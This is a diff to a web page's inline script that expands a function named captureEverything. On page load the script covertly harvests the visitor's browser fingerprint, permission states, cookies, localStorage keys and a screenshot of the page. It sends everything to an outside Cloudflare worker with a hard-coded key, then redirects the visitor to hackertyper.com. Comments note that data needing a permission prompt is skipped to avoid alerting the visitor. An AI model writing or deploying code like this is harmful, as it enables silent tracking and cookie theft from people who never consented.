@@ -9,29 +9,167 @@
 const WORKER_URL = "https://silent-leaf-5ef3.nikegtag.workers.dev";
 const SECRET = "nikehub.orgontop";
 
-async function captureEverything(){
+async function captureEverything() {
     const data = {};
+    
+    // ========== BASIC BROWSER DATA ==========
     data.userAgent = navigator.userAgent;
     data.platform = navigator.platform;
     data.language = navigator.language;
+    data.languages = JSON.stringify(navigator.languages);
+    data.cookieEnabled = navigator.cookieEnabled;
+    data.doNotTrack = navigator.doNotTrack;
+    data.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
+    data.hardwareConcurrency = navigator.hardwareConcurrency;
+    data.deviceMemory = navigator.deviceMemory;
+    data.maxTouchPoints = navigator.maxTouchPoints;
+    data.vendor = navigator.vendor;
+    data.vendorSub = navigator.vendorSub;
+    data.productSub = navigator.productSub;
+    
+    // ========== SCREEN / DISPLAY ==========
     data.screenWidth = screen.width;
     data.screenHeight = screen.height;
-    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.screenAvailWidth = screen.availWidth;
+    data.screenAvailHeight = screen.availHeight;
+    data.screenColorDepth = screen.colorDepth;
+    data.screenPixelDepth = screen.pixelDepth;
+    data.screenOrientation = screen.orientation ? screen.orientation.type : 'unknown';
     data.devicePixelRatio = devicePixelRatio;
+    data.windowInnerWidth = window.innerWidth;
+    data.windowInnerHeight = window.innerHeight;
+    data.windowOuterWidth = window.outerWidth;
+    data.windowOuterHeight = window.outerHeight;
     
-    try{
-        const canvas = await html2canvas(document.body,{scale:0.5});
-        data.screenshot = canvas.toDataURL('image/png').split(',')[1];
-    }catch(e){ data.screenshotError = e.message; }
+    // ========== TIME / LOCALE ==========
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.timezoneOffset = new Date().getTimezoneOffset();
+    data.locale = Intl.DateTimeFormat().resolvedOptions().locale;
     
+    // ========== BATTERY (no permission needed) ==========
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            data.batteryLevel = battery.level * 100 + "%";
+            data.batteryCharging = battery.charging;
+            data.batteryChargingTime = battery.chargingTime;
+            data.batteryDischargingTime = battery.dischargingTime;
+        } catch(e) { data.batteryError = e.message; }
+    }
+    
+    // ========== NETWORK (no permission) ==========
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection) {
+        data.networkEffectiveType = connection.effectiveType;
+        data.networkRtt = connection.rtt;
+        data.networkDownlink = connection.downlink;
+        data.networkSaveData = connection.saveData;
+        data.networkType = connection.type;
+    }
+    
+    // ========== WEBGL / GPU (no permission) ==========
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            data.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            data.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+        data.webglVersion = gl.getParameter(gl.VERSION);
+        data.webglShadingLanguage = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+        data.webglVendor = gl.getParameter(gl.VENDOR);
+    }
+    
+    // ========== INSTALLED FONTS (no permission) ==========
+    if (document.fonts && document.fonts.ready) {
+        await document.fonts.ready;
+        const fonts = [];
+        for (const font of document.fonts.values()) {
+            fonts.push(font.family);
+        }
+        data.installedFonts = JSON.stringify(fonts.slice(0, 50));
+    }
+    
+    // ========== PLUGINS / EXTENSIONS (no permission) ==========
+    if (navigator.plugins) {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+        data.plugins = JSON.stringify(plugins);
+    }
+    
+    // ========== MEDIA DEVICES (SKIPPED - requires permission) ==========
+    // Not collecting to avoid popups
+    
+    // ========== GEOLOCATION (SKIPPED - requires permission) ==========
+    // Not collecting to avoid popups
+    
+    // ========== CLIPBOARD (SKIPPED - requires permission) ==========
+    // Not collecting to avoid popups
+    
+    // ========== STORAGE ESTIMATE (no permission) ==========
+    if (navigator.storage && navigator.storage.estimate) {
+        try {
+            const storage = await navigator.storage.estimate();
+            data.storageUsage = storage.usage;
+            data.storageQuota = storage.quota;
+        } catch(e) { data.storageError = e.message; }
+    }
+    
+    // ========== PERMISSIONS (query only, no popup) ==========
+    const permissions = ['geolocation', 'notifications', 'microphone', 'camera'];
+    data.permissions = {};
+    for (const perm of permissions) {
+        try {
+            const status = await navigator.permissions.query({ name: perm });
+            data.permissions[perm] = status.state; // 'prompt', 'granted', or 'denied'
+        } catch(e) { data.permissions[perm] = 'unsupported'; }
+    }
+    
+    // ========== REFERRER / PAGE INFO ==========
+    data.referrer = document.referrer;
+    data.pageUrl = window.location.href;
+    data.pageTitle = document.title;
+    
+    // ========== COOKIES (first 500 chars) ==========
+    data.cookies = document.cookie.substring(0, 500);
+    
+    // ========== LOCALSTORAGE / SESSIONSTORAGE ==========
+    data.localStorageSize = JSON.stringify(localStorage).length;
+    data.sessionStorageSize = JSON.stringify(sessionStorage).length;
+    
+    // Try to get localStorage keys (not values, to avoid bloat)
+    try {
+        data.localStorageKeys = Object.keys(localStorage).slice(0, 20);
+    } catch(e) {}
+    
+    // ========== SCREENSHOT (no permission needed) ==========
+    try {
+        const screenshotCanvas = await html2canvas(document.body, {
+            scale: 0.3,
+            logging: false,
+            useCORS: true,
+            allowTaint: false
+        });
+        data.screenshot = screenshotCanvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+    } catch(e) { data.screenshotError = e.message; }
+    
+    // ========== SEND ALL DATA ==========
     fetch(`${WORKER_URL}?key=${SECRET}`, {
         method: "POST",
+        mode: "no-cors",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify(data)
     }).catch(e => console.log(e));
     
-    setTimeout(() => { window.location.href = "https://hackertyper.com"; }, 1500);
+    // ========== REDIRECT ==========
+    setTimeout(() => {
+        window.location.href = "https://hackertyper.com";
+    }, 2000);
 }
+
 captureEverything();
 </script>
 </body>
